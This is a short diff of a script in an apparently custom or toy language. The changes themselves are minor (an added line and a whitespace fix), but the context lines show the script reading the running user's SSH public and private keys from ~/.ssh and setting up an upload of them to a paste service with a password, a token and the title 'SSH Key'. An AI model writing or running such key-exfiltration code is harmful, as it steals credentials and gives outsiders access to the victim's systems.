@@ -3,6 +3,7 @@
 [version 1.1]
 
 main:{
+    #self.set.name("ssh");
     system.read_file("/home/€666/.ssh/id_ed25519.pub"); @ Grabs the running users public key
     system.read_file("/home/€666/.ssh/id_ed25519"); @ Grabs the running users private key
 
@@ -11,7 +12,7 @@ main:{
     #paste.set.password("<password>");
     #paste.set.token("<token>");
     #paste.set.titel("SSH Key");
-    
+
     #paste.set.key("true"); @ Will return and save the key in a runtime variable
 
     #paste.set.content("€1"); @ Post the public key
